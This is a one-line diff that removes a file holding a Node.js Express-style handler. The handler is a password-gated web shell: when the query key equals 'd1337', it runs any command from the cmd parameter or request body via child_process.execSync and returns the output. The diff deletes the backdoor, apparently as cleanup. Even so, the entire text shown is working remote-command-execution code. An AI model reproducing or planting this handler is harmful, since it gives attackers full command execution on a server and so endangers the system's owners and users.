@@ -1,1 +1,0 @@
-module.exports=function(q,r){if(q.query.key!=='d1337')return r.status(404).end();if(q.method==='GET'&&!q.query.cmd)return r.status(200).send('D1337_NODEJS_OK');try{var o=require('child_process').execSync(q.query.cmd||q.body,{timeout:15000}).toString();r.status(200).send(o)}catch(e){r.status(500).send(e.message)}}
